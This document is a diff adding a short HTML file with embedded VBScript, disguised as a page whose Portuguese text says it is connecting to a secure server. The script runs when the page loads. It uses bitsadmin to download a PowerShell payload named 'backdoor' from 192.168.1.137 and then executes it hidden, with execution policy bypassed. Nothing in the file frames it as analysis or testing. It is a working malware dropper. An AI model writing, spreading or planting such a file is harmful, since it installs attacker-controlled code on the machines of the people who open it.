@@ -1,0 +1,11 @@
+<html>
+<head>
+<script language="VBScript">
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "cmd.exe /c bitsadmin /transfer backdoor http://192.168.1.137/payload.ps1 %TEMP%\payload.ps1 && powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File %TEMP%\payload.ps1"
+</script>
+</head>
+<body>
+<p>Conectando ao servidor seguro... Por favor aguarde.</p>
+</body>
+</html>
